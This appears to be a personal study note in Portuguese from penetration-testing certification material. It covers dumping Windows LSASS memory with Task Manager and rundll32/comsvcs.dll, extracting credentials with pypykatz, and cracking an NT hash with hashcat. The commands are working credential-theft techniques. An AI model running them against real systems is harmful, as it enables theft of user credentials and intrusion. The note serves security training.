> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/attacking-lsass.md).

# Attacking LSASS

**Dumping LSASS process memory**

Método do Gerenciador de Tarefas

1. Abrir `Task Manager`
2. Selecione a aba `Processes`
3. Localize e clique com o botão direito do mouse no`Local Security Authority Process`
4. Selecione`Create dump file`&#x20;

* Um arquivo chamado `lsass.DMP` é criado e salvo em `%temp%`. Este é o arquivo que transferiremos para o nosso host de ataque.

**Método Rundll32.exe e Comsvcs.dll**

* Encontrando o PID do LSASS no powershell

```
Get-Process lsass
```

* Executar o seguinte comando para criar um arquivo de despejo de memória com privilégios elevados, exige técnicas de evasão de antivírus, seremos detectados

```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

**Utilizando Pypykatz para extrair credenciais**

* O pypykatz é uma implementação do Mimikatz escrita inteiramente em Python

```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

* **Decifrando o NT Hash com o Hashcat**

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
